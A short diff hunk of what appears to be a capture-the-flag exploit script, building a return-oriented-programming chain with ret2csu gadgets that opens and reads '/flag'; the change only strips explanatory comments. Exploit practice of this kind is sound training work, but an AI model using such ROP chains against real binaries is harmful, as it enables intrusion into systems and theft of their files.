@@ -26,8 +26,8 @@ rop = flat(
     0, 0, 0, 0, 0, 0, 0,
 
     POP_RDI,    BSS + 8,
-    POP_RSI_R15, 0, 0,      # rsi=0 (O_RDONLY), r15 junk
-    JMP_RAX,                # open("/flag", 0) -> fd in rax
+    POP_RSI_R15, 0, 0,      
+    JMP_RAX,                
 
     CSE_1,  0, 1,  3,       BSS,  100, READ_GOT,
     CSE_2,
